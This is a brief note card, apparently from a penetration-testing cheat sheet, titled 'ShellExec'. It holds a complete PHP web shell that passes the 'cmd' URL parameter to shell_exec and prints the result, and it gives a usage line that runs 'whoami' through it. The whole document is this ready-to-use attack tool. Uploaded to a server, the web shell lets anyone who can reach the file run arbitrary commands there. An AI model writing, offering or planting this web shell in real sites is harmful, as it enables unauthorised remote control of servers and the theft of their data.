
> [!danger] ShellExec
>```php
><?php
>$output = shell_exec($_GET["cmd"]);
>echo "<pre>$output</pre>";
>?>
>```
>> [!info]- Usage
>> ```
>> shell.php?cmd=whoami
>> ```

